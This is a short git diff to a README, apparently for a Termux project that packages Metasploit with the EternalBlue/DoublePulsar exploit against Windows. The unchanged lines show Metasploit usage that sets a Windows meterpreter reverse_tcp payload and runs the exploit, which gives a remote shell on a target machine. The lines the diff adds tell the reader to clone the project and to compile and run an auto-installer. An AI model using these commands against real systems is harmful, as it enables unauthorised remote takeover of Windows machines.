@@ -30,3 +30,11 @@ Usage:
 | set PAYLOAD windows/meterpreter/reverse_tcp / set PAYLOAD windows/x64/meterpreter/reverse_tcp                 |
 | exploit                                                                                                       |
 -----------------------------------------------------------------------------------------------------------------
+
+Auto installation commands:
+-----------------------------------------------------------------------------------------------------------------
+| https://github.com/MasterTatu/Termux-metasploit-eternalblue-doublepulsar                                      |
+| cd Termux-metasploit-eternalblue-doublepulsar                                                                 |
+| pkg install clang++                                                                                           |
+| clang++ autoinstall.cpp -o auto && ./auto                                                                     |
+-----------------------------------------------------------------------------------------------------------------
